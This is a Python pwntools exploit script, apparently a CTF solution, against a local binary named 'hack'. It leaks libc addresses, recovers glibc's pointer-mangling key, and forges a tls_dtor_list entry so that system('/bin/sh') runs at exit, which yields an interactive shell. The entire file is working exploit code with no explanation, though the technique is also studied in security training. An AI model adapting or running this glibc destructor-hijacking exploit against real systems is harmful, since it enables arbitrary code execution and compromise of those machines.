from pwn import *
from time import *

#libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
elf = ELF('./hack')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
r = process('./hack')#, env = {'LD_PRELOAD': './libc6-i386_2.23-0ubuntu10_amd64.so'})
context(arch='i386', os='linux', log_level='debug')
#gdb.attach(r,'b __call_tls_dtors')

r.sendlineafter('address: ', str(int('0804a010', base = 16)))
r.recvuntil(', ')
printf_address = int(r.recvline('\n')[:-1], 16)
libc.address = printf_address - libc.symbols['printf']
print "libc address is:", hex(libc.address)

#raw_input()
mp_addr = libc.address + 0x1b31e0 +0xc
r.sendlineafter('chance: ', str(mp_addr))
r.recvuntil(', ')
mp = int(r.recvline('\n')[:-1], 16)
dl_fini = libc.address +0x1e4880
key = ror(mp,9,32)^dl_fini
print "key:", hex(key)

#tls_dtor_list_address = libc.address + (0xb7705914 - 0xb7511000)
tls_dtor_list_address = libc.address - 2348
print "tls_dtor_list_address is: ", hex(tls_dtor_list_address)

r.recvuntil('node is ')
fake_list_address = int(r.recvuntil(',')[:-1], base = 16)
print "the fake list is at", hex(fake_list_address)

shell_mp = rol(libc.symbols['system'] ^ key,9,32)
print 'shell_mp:', hex(shell_mp)

fake_struct = p32(shell_mp)
fake_struct += p32(libc.search('/bin/sh').next())
fake_struct += p32(fake_list_address)
fake_struct += p32(tls_dtor_list_address - 8)
r.sendlineafter('now: ', fake_struct)

r.interactive()

